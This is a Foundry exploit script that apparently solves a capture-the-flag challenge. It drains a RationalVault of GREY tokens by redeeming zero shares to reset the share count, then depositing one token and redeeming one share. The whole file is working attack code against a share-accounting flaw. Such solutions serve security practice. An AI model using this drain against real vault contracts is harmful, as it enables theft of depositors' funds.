// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import { Setup } from "src/Setup.sol";
import { GREY } from "src/lib/GREY.sol";
import { RationalVault } from "src/Vault.sol";
import {console2} from "forge-std/console2.sol";
import { Script } from "forge-std/Script.sol";

contract Exploit is Script {
    Setup setup;
    GREY grey;
    RationalVault vault;

    constructor() {
        setup = Setup(vm.envAddress("SETUP_CONTRACT"));
        grey = setup.grey();
        vault = setup.vault();
    }

    function run() external returns (bool) {
        vm.startBroadcast();

        setup.claim();
        // // Approve the vault to spend your GREY
        grey.approve(address(vault), 1000e18);

        // Redeem 0 shares to make the totalShares to become 0
        vault.redeem(0);

        // Deposit 1 GREY to make the totalShares to become 1, and become the only shareholder
        vault.deposit(1);

        // Redeem 1 share to get all the GREY in the vault
        vault.redeem(1);
        
        console2.log("Our GREY balance:", grey.balanceOf(vm.envAddress("WALLET")));
        vm.stopBroadcast();
        return setup.isSolved();
    }
}